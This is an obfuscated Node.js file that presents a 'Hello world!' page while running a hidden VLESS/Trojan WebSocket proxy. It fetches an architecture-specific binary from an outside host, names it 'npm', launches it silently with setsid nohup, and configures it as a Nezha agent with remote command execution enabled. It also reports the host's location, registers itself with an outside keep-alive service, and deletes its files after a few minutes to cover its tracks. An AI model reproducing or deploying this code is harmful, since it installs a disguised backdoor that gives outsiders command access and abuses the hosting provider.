const _0x591add=_0x15fe;(function(_0x181022,_0x1beb48){const _0x165c47=_0x15fe,_0x3c2b30=_0x181022();while(!![]){try{const _0x92d354=parseInt(_0x165c47(0x164))/0x1+-parseInt(_0x165c47(0x1c9))/0x2+-parseInt(_0x165c47(0x1ae))/0x3*(parseInt(_0x165c47(0x174))/0x4)+-parseInt(_0x165c47(0x1d8))/0x5*(-parseInt(_0x165c47(0x1bd))/0x6)+parseInt(_0x165c47(0x170))/0x7+parseInt(_0x165c47(0x198))/0x8*(-parseInt(_0x165c47(0x1b5))/0x9)+parseInt(_0x165c47(0x19b))/0xa*(parseInt(_0x165c47(0x180))/0xb);if(_0x92d354===_0x1beb48)break;else _0x3c2b30['push'](_0x3c2b30['shift']());}catch(_0x1fa5e3){_0x3c2b30['push'](_0x3c2b30['shift']());}}}(_0x3bee,0xd817d));const os=require('os'),http=require(_0x591add(0x1a6)),fs=require('fs'),axios=require(_0x591add(0x1a5)),net=require(_0x591add(0x192)),path=require(_0x591add(0x1cd)),crypto=require(_0x591add(0x1b3)),{Buffer}=require(_0x591add(0x1d0)),{exec,execSync}=require(_0x591add(0x1af)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env']['UUID']||_0x591add(0x18c),NEZHA_SERVER=process[_0x591add(0x166)][_0x591add(0x1d9)]||'',NEZHA_PORT=process[_0x591add(0x166)][_0x591add(0x185)]||'',NEZHA_KEY=process[_0x591add(0x166)]['NEZHA_KEY']||'',DOMAIN=process['env']['DOMAIN']||_0x591add(0x1a4),AUTO_ACCESS=process[_0x591add(0x166)]['AUTO_ACCESS']||!![],WSPATH=process['env'][_0x591add(0x18e)]||UUID[_0x591add(0x1d1)](0x0,0x8),SUB_PATH=process[_0x591add(0x166)][_0x591add(0x1c8)]||_0x591add(0x1a0),NAME=process[_0x591add(0x166)]['NAME']||'',PORT=process[_0x591add(0x166)][_0x591add(0x1de)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x81a27a=_0x591add;try{const _0x350d97=await axios[_0x81a27a(0x1dc)]('https://api.ip.sb/geoip'),_0x4431fa=_0x350d97['data'];ISP=(_0x4431fa[_0x81a27a(0x162)]+'-'+_0x4431fa[_0x81a27a(0x17d)])[_0x81a27a(0x1b1)](/ /g,'_');}catch(_0x129fc6){ISP=_0x81a27a(0x1da);}};GetISP();const httpServer=http[_0x591add(0x196)]((_0x98b65a,_0xe2a370)=>{const _0x553156=_0x591add;if(_0x98b65a[_0x553156(0x1c4)]==='/'){const _0xf511aa=path[_0x553156(0x176)](__dirname,'index.html');fs[_0x553156(0x171)](_0xf511aa,_0x553156(0x193),(_0x25478d,_0x53cb76)=>{const _0x39d647=_0x553156;if(_0x25478d){_0xe2a370[_0x39d647(0x1b8)](0xc8,{'Content-Type':'text/html'}),_0xe2a370[_0x39d647(0x17a)](_0x39d647(0x16a));return;}_0xe2a370[_0x39d647(0x1b8)](0xc8,{'Content-Type':_0x39d647(0x1cc)}),_0xe2a370[_0x39d647(0x17a)](_0x53cb76);});return;}else{if(_0x98b65a[_0x553156(0x1c4)]==='/'+SUB_PATH){const _0x329a0b=NAME?NAME+'-'+ISP:ISP,_0x333b8d=_0x553156(0x167)+UUID+'@'+DOMAIN+_0x553156(0x1ab)+DOMAIN+_0x553156(0x1c6)+DOMAIN+_0x553156(0x163)+WSPATH+'#'+_0x329a0b,_0x3d7ff9=_0x553156(0x1bb)+UUID+'@'+DOMAIN+_0x553156(0x1ad)+DOMAIN+_0x553156(0x1c6)+DOMAIN+_0x553156(0x163)+WSPATH+'#'+_0x329a0b,_0x3658af=_0x333b8d+'\x0a'+_0x3d7ff9,_0x46a5c7=Buffer[_0x553156(0x1be)](_0x3658af)[_0x553156(0x1b0)](_0x553156(0x187));_0xe2a370[_0x553156(0x1b8)](0xc8,{'Content-Type':_0x553156(0x16e)}),_0xe2a370['end'](_0x46a5c7+'\x0a');}else _0xe2a370['writeHead'](0x194,{'Content-Type':'text/plain'}),_0xe2a370['end'](_0x553156(0x1ca));}}),wss=new WebSocket[(_0x591add(0x172))]({'server':httpServer}),uuid=UUID[_0x591add(0x1b1)](/-/g,''),DNS_SERVERS=[_0x591add(0x1c3),_0x591add(0x191)];function _0x15fe(_0x5170d2,_0x238749){_0x5170d2=_0x5170d2-0x162;const _0x3bee9c=_0x3bee();let _0x15fe03=_0x3bee9c[_0x5170d2];return _0x15fe03;}function resolveHost(_0x2447ac){return new Promise((_0x5658f3,_0x619c8)=>{const _0x3e2f2a=_0x15fe;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x3e2f2a(0x1df)](_0x2447ac)){_0x5658f3(_0x2447ac);return;}let _0x47b293=0x0;function _0xc79716(){const _0x107579=_0x3e2f2a;if(_0x47b293>=DNS_SERVERS[_0x107579(0x16d)]){_0x619c8(new Error(_0x107579(0x168)+_0x2447ac+_0x107579(0x183)));return;}const _0x1ae467=DNS_SERVERS[_0x47b293];_0x47b293++;const _0x3094cc=_0x107579(0x1b6)+encodeURIComponent(_0x2447ac)+_0x107579(0x165);axios['get'](_0x3094cc,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})['then'](_0x26f306=>{const _0x52f42e=_0x107579,_0x3136c0=_0x26f306[_0x52f42e(0x16c)];if(_0x3136c0[_0x52f42e(0x1aa)]===0x0&&_0x3136c0[_0x52f42e(0x188)]&&_0x3136c0[_0x52f42e(0x188)][_0x52f42e(0x16d)]>0x0){const _0x84531a=_0x3136c0[_0x52f42e(0x188)]['find'](_0xb91a0c=>_0xb91a0c['type']===0x1);if(_0x84531a){_0x5658f3(_0x84531a['data']);return;}}_0xc79716();})[_0x107579(0x19f)](_0x539459=>{_0xc79716();});}_0xc79716();});}function handleVlessConnection(_0x159d33,_0xcf6d87){const _0x153a90=_0x591add,[_0xeccb50]=_0xcf6d87,_0x54023e=_0xcf6d87['slice'](0x1,0x11);if(!_0x54023e['every']((_0x36e494,_0x5008c2)=>_0x36e494==parseInt(uuid[_0x153a90(0x1b7)](_0x5008c2*0x2,0x2),0x10)))return![];let _0xf09cf0=_0xcf6d87[_0x153a90(0x1d1)](0x11,0x12)[_0x153a90(0x1cf)]()+0x13;const _0x222c99=_0xcf6d87['slice'](_0xf09cf0,_0xf09cf0+=0x2)['readUInt16BE'](0x0),_0x64f61a=_0xcf6d87[_0x153a90(0x1d1)](_0xf09cf0,_0xf09cf0+=0x1)[_0x153a90(0x1cf)](),_0x5ba80b=_0x64f61a==0x1?_0xcf6d87[_0x153a90(0x1d1)](_0xf09cf0,_0xf09cf0+=0x4)[_0x153a90(0x176)]('.'):_0x64f61a==0x2?new TextDecoder()[_0x153a90(0x1bc)](_0xcf6d87[_0x153a90(0x1d1)](_0xf09cf0+0x1,_0xf09cf0+=0x1+_0xcf6d87['slice'](_0xf09cf0,_0xf09cf0+0x1)['readUInt8']())):_0x64f61a==0x3?_0xcf6d87[_0x153a90(0x1d1)](_0xf09cf0,_0xf09cf0+=0x10)['reduce']((_0xda179a,_0x16cd11,_0x429e1c,_0x8361ba)=>_0x429e1c%0x2?_0xda179a[_0x153a90(0x18a)](_0x8361ba[_0x153a90(0x1d1)](_0x429e1c-0x1,_0x429e1c+0x1)):_0xda179a,[])[_0x153a90(0x1a2)](_0x97440d=>_0x97440d['readUInt16BE'](0x0)[_0x153a90(0x1b0)](0x10))[_0x153a90(0x176)](':'):'';_0x159d33[_0x153a90(0x181)](new Uint8Array([_0xeccb50,0x0]));const _0x249751=createWebSocketStream(_0x159d33);return resolveHost(_0x5ba80b)['then'](_0x5b68ef=>{const _0x3a9e6f=_0x153a90;net[_0x3a9e6f(0x17c)]({'host':_0x5b68ef,'port':_0x222c99},function(){const _0x1ab540=_0x3a9e6f;this[_0x1ab540(0x195)](_0xcf6d87[_0x1ab540(0x1d1)](_0xf09cf0)),_0x249751['on'](_0x1ab540(0x189),()=>{})['pipe'](this)['on'](_0x1ab540(0x189),()=>{})[_0x1ab540(0x19e)](_0x249751);})['on'](_0x3a9e6f(0x189),()=>{});})[_0x153a90(0x19f)](_0x3588c0=>{const _0x503453=_0x153a90;net[_0x503453(0x17c)]({'host':_0x5ba80b,'port':_0x222c99},function(){const _0x3f5c30=_0x503453;this[_0x3f5c30(0x195)](_0xcf6d87[_0x3f5c30(0x1d1)](_0xf09cf0)),_0x249751['on'](_0x3f5c30(0x189),()=>{})[_0x3f5c30(0x19e)](this)['on']('error',()=>{})['pipe'](_0x249751);})['on'](_0x503453(0x189),()=>{});}),!![];}function handleTrojanConnection(_0x22615d,_0x215542){const _0x2e8d1b=_0x591add;try{if(_0x215542[_0x2e8d1b(0x16d)]<0x3a)return![];const _0x1c37e1=_0x215542[_0x2e8d1b(0x1d1)](0x0,0x38)[_0x2e8d1b(0x1b0)](),_0x4921e1=[UUID];let _0x25bb0f=null;for(const _0x2eb785 of _0x4921e1){const _0x477c11=crypto[_0x2e8d1b(0x1e0)]('sha224')[_0x2e8d1b(0x1c2)](_0x2eb785)[_0x2e8d1b(0x179)](_0x2e8d1b(0x190));if(_0x477c11===_0x1c37e1){_0x25bb0f=_0x2eb785;break;}}if(!_0x25bb0f)return![];let _0x5ab86d=0x38;_0x215542[_0x5ab86d]===0xd&&_0x215542[_0x5ab86d+0x1]===0xa&&(_0x5ab86d+=0x2);const _0x11d46f=_0x215542[_0x5ab86d];if(_0x11d46f!==0x1)return![];_0x5ab86d+=0x1;const _0x1c6e0a=_0x215542[_0x5ab86d];_0x5ab86d+=0x1;let _0x15d236,_0x42e834;if(_0x1c6e0a===0x1)_0x15d236=_0x215542[_0x2e8d1b(0x1d1)](_0x5ab86d,_0x5ab86d+0x4)[_0x2e8d1b(0x176)]('.'),_0x5ab86d+=0x4;else{if(_0x1c6e0a===0x3){const _0x12bf64=_0x215542[_0x5ab86d];_0x5ab86d+=0x1,_0x15d236=_0x215542[_0x2e8d1b(0x1d1)](_0x5ab86d,_0x5ab86d+_0x12bf64)[_0x2e8d1b(0x1b0)](),_0x5ab86d+=_0x12bf64;}else{if(_0x1c6e0a===0x4)_0x15d236=_0x215542['slice'](_0x5ab86d,_0x5ab86d+0x10)[_0x2e8d1b(0x199)]((_0x4b4fb6,_0x4f5c4a,_0x35db1f,_0x55e0c8)=>_0x35db1f%0x2?_0x4b4fb6[_0x2e8d1b(0x18a)](_0x55e0c8[_0x2e8d1b(0x1d1)](_0x35db1f-0x1,_0x35db1f+0x1)):_0x4b4fb6,[])[_0x2e8d1b(0x1a2)](_0x487cd8=>_0x487cd8['readUInt16BE'](0x0)[_0x2e8d1b(0x1b0)](0x10))[_0x2e8d1b(0x176)](':'),_0x5ab86d+=0x10;else return![];}}_0x42e834=_0x215542['readUInt16BE'](_0x5ab86d),_0x5ab86d+=0x2;_0x5ab86d<_0x215542[_0x2e8d1b(0x16d)]&&_0x215542[_0x5ab86d]===0xd&&_0x215542[_0x5ab86d+0x1]===0xa&&(_0x5ab86d+=0x2);const _0x28ef74=createWebSocketStream(_0x22615d);return resolveHost(_0x15d236)[_0x2e8d1b(0x182)](_0xeb50cb=>{const _0x4a4558=_0x2e8d1b;net[_0x4a4558(0x17c)]({'host':_0xeb50cb,'port':_0x42e834},function(){const _0x23919a=_0x4a4558;_0x5ab86d<_0x215542[_0x23919a(0x16d)]&&this[_0x23919a(0x195)](_0x215542['slice'](_0x5ab86d)),_0x28ef74['on']('error',()=>{})[_0x23919a(0x19e)](this)['on']('error',()=>{})[_0x23919a(0x19e)](_0x28ef74);})['on'](_0x4a4558(0x189),()=>{});})['catch'](_0x180462=>{const _0x1e50a4=_0x2e8d1b;net['connect']({'host':_0x15d236,'port':_0x42e834},function(){const _0x5dc471=_0x15fe;_0x5ab86d<_0x215542[_0x5dc471(0x16d)]&&this[_0x5dc471(0x195)](_0x215542[_0x5dc471(0x1d1)](_0x5ab86d)),_0x28ef74['on'](_0x5dc471(0x189),()=>{})[_0x5dc471(0x19e)](this)['on']('error',()=>{})['pipe'](_0x28ef74);})['on'](_0x1e50a4(0x189),()=>{});}),!![];}catch(_0x50a9d6){return![];}}wss['on'](_0x591add(0x186),(_0x25741a,_0x953da2)=>{const _0x102708=_0x591add,_0x174a94=_0x953da2[_0x102708(0x1c4)]||'';_0x25741a[_0x102708(0x194)]('message',_0x2123b1=>{const _0xecf0f3=_0x102708;if(_0x2123b1[_0xecf0f3(0x16d)]>0x11&&_0x2123b1[0x0]===0x0){const _0x4e9725=_0x2123b1['slice'](0x1,0x11),_0x15419e=_0x4e9725[_0xecf0f3(0x18b)]((_0xcb3595,_0x2e5ed8)=>_0xcb3595==parseInt(uuid['substr'](_0x2e5ed8*0x2,0x2),0x10));if(_0x15419e){!handleVlessConnection(_0x25741a,_0x2123b1)&&_0x25741a[_0xecf0f3(0x1d2)]();return;}}!handleTrojanConnection(_0x25741a,_0x2123b1)&&_0x25741a[_0xecf0f3(0x1d2)]();})['on'](_0x102708(0x189),()=>{});});function _0x3bee(){const _0x106f54=['Server','pop','504084tpMrNA','2087','join','stream','2053','digest','end','error:\x20','connect','isp','2096','finish','22fegvQo','send','then','\x20with\x20all\x20DNS\x20servers','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','NEZHA_PORT','connection','base64','Answer','error','concat','every','48722d4b-eceb-428f-af53-d18011ced9a3','https://amd64.ssss.nyc.mn/agent','WSPATH','npm\x20is\x20running','hex','1.1.1.1','net','utf8','once','write','createServer','client_secret:\x20','40paxDHT','reduce','setsid\x20nohup\x20./npm\x20-s\x20','3020950VcDKgG','trim','Automatic\x20Access\x20Task\x20added\x20successfully','pipe','catch','sub','post','map','https://arm64.ssss.nyc.mn/agent','1234.abc.com','axios','http','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','https://oooo.serv00.net/add-url','writeFileSync','Status',':443?encryption=none&security=tls&sni=','https://amd64.ssss.nyc.mn/v1',':443?security=tls&sni=','27mWiYIW','child_process','toString','replace','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','crypto','443','194850YJDtBy','https://dns.google/resolve?name=','substr','writeHead','true','--tls','trojan://','decode','3531174KuVTaj','from','false','config.yaml','arm64','update','8.8.4.4','url','Server\x20is\x20running\x20on\x20port\x20','&fp=chrome&type=ws&host=','split','SUB_PATH','1620868JPNAhf','Not\x20Found\x0a','application/json','text/html','path','listen','readUInt8','buffer','slice','close','\x20-p\x20','createWriteStream','npm','unlink','log','5nTbCqx','NEZHA_SERVER','Unknown','chmod\x20+x\x20npm','get','utf-8','PORT','test','createHash','country_code','&path=%2F','810043XtSozO','&type=A','env','vless://','Failed\x20to\x20resolve\x20','https://','Hello\x20world!','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','data','length','text/plain','includes','6546596yzhQjc','readFile'];_0x3bee=function(){return _0x106f54;};return _0x3bee();}const getDownloadUrl=()=>{const _0x4015a7=_0x591add,_0x224b39=os['arch']();return _0x224b39==='arm'||_0x224b39===_0x4015a7(0x1c1)||_0x224b39==='aarch64'?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x4015a7(0x1a3):!NEZHA_PORT?_0x4015a7(0x1ac):_0x4015a7(0x18d);},downloadFile=async()=>{const _0x4f4b58=_0x591add;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0xbd8a61=getDownloadUrl(),_0x509112=await axios({'method':_0x4f4b58(0x1dc),'url':_0xbd8a61,'responseType':_0x4f4b58(0x177)}),_0x1d42b0=fs[_0x4f4b58(0x1d4)](_0x4f4b58(0x1d5));return _0x509112['data'][_0x4f4b58(0x19e)](_0x1d42b0),new Promise((_0x3cc6c1,_0x118d5d)=>{const _0x836063=_0x4f4b58;_0x1d42b0['on'](_0x836063(0x17f),()=>{const _0x6ade56=_0x836063;console[_0x6ade56(0x1d7)]('npm\x20download\x20successfully'),exec(_0x6ade56(0x1db),_0x3fd621=>{if(_0x3fd621)_0x118d5d(_0x3fd621);_0x3cc6c1();});}),_0x1d42b0['on'](_0x836063(0x189),_0x118d5d);});}catch(_0x5d2ab8){throw _0x5d2ab8;}},runnz=async()=>{const _0x3a0931=_0x591add;try{const _0x5b78a2=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x3a0931(0x1dd)});if(_0x5b78a2[_0x3a0931(0x19c)]()!==''){console[_0x3a0931(0x1d7)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x2ba2db){}await downloadFile();let _0x126c2e='',_0x58717f=[_0x3a0931(0x1b4),'8443',_0x3a0931(0x17e),_0x3a0931(0x175),'2083',_0x3a0931(0x178)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x1021b2=_0x58717f[_0x3a0931(0x16f)](NEZHA_PORT)?_0x3a0931(0x1ba):'';_0x126c2e=_0x3a0931(0x19a)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3a0931(0x1d3)+NEZHA_KEY+'\x20'+_0x1021b2+_0x3a0931(0x16b);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x489bea=NEZHA_SERVER[_0x3a0931(0x16f)](':')?NEZHA_SERVER[_0x3a0931(0x1c7)](':')[_0x3a0931(0x173)]():'',_0x340376=_0x58717f['includes'](_0x489bea)?_0x3a0931(0x1b9):_0x3a0931(0x1bf),_0x29d459=_0x3a0931(0x197)+NEZHA_KEY+_0x3a0931(0x1b2)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x340376+_0x3a0931(0x1a7)+UUID;fs[_0x3a0931(0x1a9)](_0x3a0931(0x1c0),_0x29d459);}_0x126c2e='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console['log'](_0x3a0931(0x184));return;}}try{exec(_0x126c2e,{'shell':'/bin/bash'},_0x459e68=>{const _0x1ca7b2=_0x3a0931;if(_0x459e68)console[_0x1ca7b2(0x189)]('npm\x20running\x20error:',_0x459e68);else console[_0x1ca7b2(0x1d7)](_0x1ca7b2(0x18f));});}catch(_0x242bb5){console[_0x3a0931(0x189)](_0x3a0931(0x17b)+_0x242bb5);}};async function addAccessTask(){const _0x7d5dbb=_0x591add;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x4b8565=_0x7d5dbb(0x169)+DOMAIN;try{const _0x5dcbd5=await axios[_0x7d5dbb(0x1a1)](_0x7d5dbb(0x1a8),{'url':_0x4b8565},{'headers':{'Content-Type':_0x7d5dbb(0x1cb)}});console[_0x7d5dbb(0x1d7)](_0x7d5dbb(0x19d));}catch(_0x1e92cb){}}const delFiles=()=>{const _0x39a033=_0x591add;fs[_0x39a033(0x1d6)](_0x39a033(0x1d5),()=>{}),fs[_0x39a033(0x1d6)](_0x39a033(0x1c0),()=>{});};httpServer[_0x591add(0x1ce)](PORT,()=>{const _0x536e0d=_0x591add;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x536e0d(0x1d7)](_0x536e0d(0x1c5)+PORT);});
